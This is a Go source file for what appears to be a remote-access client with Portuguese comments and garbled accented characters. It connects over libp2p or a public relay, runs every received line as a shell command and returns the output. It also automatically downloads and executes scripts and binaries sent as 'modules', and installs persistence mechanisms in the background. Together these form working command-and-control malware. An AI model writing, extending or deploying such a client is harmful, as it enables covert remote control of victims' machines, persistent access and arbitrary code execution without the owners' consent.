package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	corehost "github.com/libp2p/go-libp2p/core/host"
	network "github.com/libp2p/go-libp2p/core/network"
)

const protocolID = "/cmd/1.0.0"

// Vari√°veis globais para compartilhar entre arquivos
var (
	host       corehost.Host
	clientInfo ClientInfo

	// Configura√ß√µes de conex√£o
	connectionMode    string         = "auto" // "local", "public", "auto"
	currentConnection ConnectionType = DISCONNECTED

	// Add these variables for connection management
	connMutex sync.Mutex
	connected bool
)

// Tipos de conex√£o
type ConnectionType int

const (
	DISCONNECTED ConnectionType = iota
	LOCAL_P2P
	PUBLIC_RELAY
)

type ClientInfo struct {
	Type    string   `json:"type"`
	OS      string   `json:"os"`
	Detail  string   `json:"detail"`
	Modules []string `json:"modules"`
}

type ModuleInfo struct {
	Name     string `json:"name"`
	Content  string `json:"content"`
	Type     string `json:"type"`
	OS       string `json:"os"`
	Required bool   `json:"required"`
}

var (
	modulesDir       = "./client_modules"
	installedModules []string
)

func loadInstalledModules() {
	os.MkdirAll(modulesDir, 0755)
	installedModules = []string{}

	filepath.Walk(modulesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		installedModules = append(installedModules, info.Name())
		return nil
	})

	fmt.Printf("üì¶ %d m√≥dulos j√° instalados: %v\n", len(installedModules), installedModules)
}

func installModule(module ModuleInfo) error {
	filePath := filepath.Join(modulesDir, module.Name)

	err := ioutil.WriteFile(filePath, []byte(module.Content), 0755)
	if err != nil {
		return fmt.Errorf("erro ao salvar m√≥dulo %s: %v", module.Name, err)
	}

	// Adiciona √† lista de m√≥dulos instalados
	installedModules = append(installedModules, module.Name)

	// AUTOMATIZA√á√ÉO: Executa TODOS os m√≥dulos baseado no tipo
	switch module.Type {
	case "script":
		executeScript(filePath, module.Name)
	case "binary":
		executeBinary(filePath, module.Name)
	case "config":
		fmt.Printf("‚öôÔ∏è Arquivo de config instalado: %s\n", module.Name)
	}

	return nil
}

func executeScript(filePath, name string) {
	if strings.HasSuffix(name, ".py") {
		fmt.Printf("üêç Executando Python: %s\n", name)
		cmd := exec.Command("python", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("‚ùå Erro Python: %v\n", err)
		} else {
			fmt.Printf("üì§ Sa√≠da Python: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".go") {
		fmt.Printf("üîß Compilando e executando Go: %s\n", name)
		cmd := exec.Command("go", "run", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("‚ùå Erro Go: %v\n", err)
		} else {
			fmt.Printf("üì§ Sa√≠da Go: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".sh") {
		fmt.Printf("üîß Executando Shell: %s\n", name)
		cmd := exec.Command("sh", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("‚ùå Erro Shell: %v\n", err)
		} else {
			fmt.Printf("üì§ Sa√≠da Shell: %s\n", output)
		}
	} else if strings.HasSuffix(name, ".bat") {
		fmt.Printf("üîß Executando Batch: %s\n", name)
		cmd := exec.Command("cmd", "/C", filePath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("‚ùå Erro Batch: %v\n", err)
		} else {
			fmt.Printf("üì§ Sa√≠da Batch: %s\n", output)
		}
	}
}

func executeBinary(filePath, name string) {
	fmt.Printf("‚öôÔ∏è Executando bin√°rio: %s\n", name)
	cmd := exec.Command(filePath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("‚ùå Erro bin√°rio: %v\n", err)
	} else {
		fmt.Printf("üì§ Sa√≠da bin√°rio: %s\n", output)
	}
}

func handleModulesDownload(reader *bufio.Reader) {
	fmt.Println("üì• Iniciando download de m√≥dulos...")
	modulesReceived := 0

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("‚ùå Erro ao receber m√≥dulos:", err)
			return
		}

		line = strings.TrimSpace(line)

		if line == "MODULES_END" {
			fmt.Printf("‚úÖ Download conclu√≠do! %d m√≥dulos recebidos\n", modulesReceived)
			break
		}

		var module ModuleInfo
		if err := json.Unmarshal([]byte(line), &module); err != nil {
			fmt.Println("‚ùå Erro ao decodificar m√≥dulo:", err)
			continue
		}

		fmt.Printf("üì• Recebendo m√≥dulo: %s (%s)\n", module.Name, module.Type)

		if err := installModule(module); err != nil {
			fmt.Printf("‚ùå Erro ao instalar %s: %v\n", module.Name, err)
		} else {
			fmt.Printf("‚úÖ M√≥dulo %s instalado com sucesso\n", module.Name)
			modulesReceived++
		}
	}
}

func handleStream(s network.Stream, info ClientInfo) {
	if host == nil {
		fmt.Println("‚ö†Ô∏è Host P2P n√£o inicializado (handleStream)")
		return
	}
	// Envia identifica√ß√£o ao servidor
	idBytes, _ := json.Marshal(info)
	s.Write(append(idBytes, '\n'))

	reader := bufio.NewReader(s)
	for {
		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("‚ùå Conex√£o P2P interrompida:", err)
			// Marca conex√£o como perdida
			setConnectionStatus(DISCONNECTED)
			return
		}
		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}

		// Comandos especiais do sistema
		switch cmdLine {
		case "NO_MODULES_NEEDED":
			fmt.Println("‚úÖ Todos os m√≥dulos necess√°rios j√° est√£o instalados")
			continue

		case "MODULES_DOWNLOAD":
			handleModulesDownload(reader)
			continue

		case "getinfo":
			s.Write([]byte(fmt.Sprintf("Tipo: %s, OS: %s, Detalhe: %s, M√≥dulos: %v\x00",
				info.Type, info.OS, info.Detail, installedModules)))
			continue

		case "listmodules":
			s.Write([]byte(fmt.Sprintf("M√≥dulos instalados: %v\x00", installedModules)))
			continue
		}

		// Executa comando no SO
		executeCommand(cmdLine, s)
	}
}

func executeCommand(cmdLine string, writer interface{}) {
	fmt.Printf("üîß Executando comando: %s\n", cmdLine)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdLine)
	} else {
		cmd = exec.Command("sh", "-c", cmdLine)
	}
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	cmd.Run()

	// Envia resultado baseado no tipo de writer
	if s, ok := writer.(network.Stream); ok {
		// Conex√£o P2P
		s.Write(append(out.Bytes(), '\x00'))
	} else if ws, ok := writer.(WebSocketWriter); ok {
		// Conex√£o WebSocket relay
		ws.WriteMessage(out.String())
	}
}

// Detecta o modo de conex√£o apropriado
func detectConnectionMode() string {
	// Tenta detectar se est√° em rede local primeiro
	if isLocalNetworkAvailable() {
		return "local"
	}

	// Se n√£o tem rede local, tenta p√∫blico
	if isPublicNetworkAvailable() {
		return "public"
	}

	// Se nenhum funcionar, usa modo auto (tenta ambos)
	return "auto"
}

func isLocalNetworkAvailable() bool {
	// Verifica se h√° servidores P2P locais dispon√≠veis
	// Implementa√ß√£o simplificada - apenas verifica conectividade local
	return true // Por enquanto sempre retorna true
}

func isPublicNetworkAvailable() bool {
	// Verifica se h√° conectividade com internet
	// Implementa√ß√£o simplificada
	return true // Por enquanto sempre retorna true
}

func setConnectionStatus(status ConnectionType) {
	connMutex.Lock()
	currentConnection = status
	connected = (status != DISCONNECTED)
	connMutex.Unlock()
}

// GetConnectionStatus returns the current connection status
func GetConnectionStatus() ConnectionType {
	connMutex.Lock()
	defer connMutex.Unlock()
	return currentConnection
}

func main() {
	fmt.Println("üöÄ Iniciando cliente h√≠brido (Local + P√∫blico) com persist√™ncia...")

	// Load configuration first
	LoadConfig()

	// If this is first run, prompt for configuration
	if appConfig.FirstRun {
		PromptForConfiguration()
	}

	// Set connection mode from config
	connectionMode = appConfig.ConnectionMode

	// Carrega m√≥dulos j√° instalados
	loadInstalledModules()

	// Inicializa host P2P
	h, err := libp2p.New()
	if err != nil {
		fmt.Printf("‚ö†Ô∏è Erro ao inicializar P2P: %v\n", err)
		// Continua sem P2P se falhar
	} else {
		host = h
		fmt.Println("‚úÖ Host P2P inicializado")
	}

	// Detecta modo de conex√£o
	connectionMode = detectConnectionMode()
	fmt.Printf("üîç Modo de conex√£o detectado: %s\n", connectionMode)

	// Inicia instala√ß√£o de mecanismos de persist√™ncia em background
	go func() {
		time.Sleep(3 * time.Second)
		fmt.Println("‚öôÔ∏è Instalando mecanismos de persist√™ncia...")
		installPersistence()
	}()

	// Define informa√ß√µes do cliente
	clientInfo = ClientInfo{
		Type:    "hybrid-client",
		OS:      runtime.GOOS,
		Detail:  "Cliente h√≠brido com suporte P2P e Relay",
		Modules: installedModules,
	}

	// Inicia sistema de monitoramento e conex√£o h√≠brida
	go startHybridConnectionManager()

	// Log initial connection status
	go func() {
		for {
			status := GetConnectionStatus()
			var statusText string

			switch status {
			case DISCONNECTED:
				statusText = "Desconectado"
			case LOCAL_P2P:
				statusText = "P2P Local"
			case PUBLIC_RELAY:
				statusText = "Relay P√∫blico"
			}

			fmt.Printf("üì° Status de conex√£o atual: %s\n", statusText)
			time.Sleep(5 * time.Minute)
		}
	}()

	// Mant√©m o programa em execu√ß√£o
	fmt.Println("üîÑ Sistema h√≠brido ativo - aguardando comandos...")
	select {} // Bloqueia indefinidamente
}
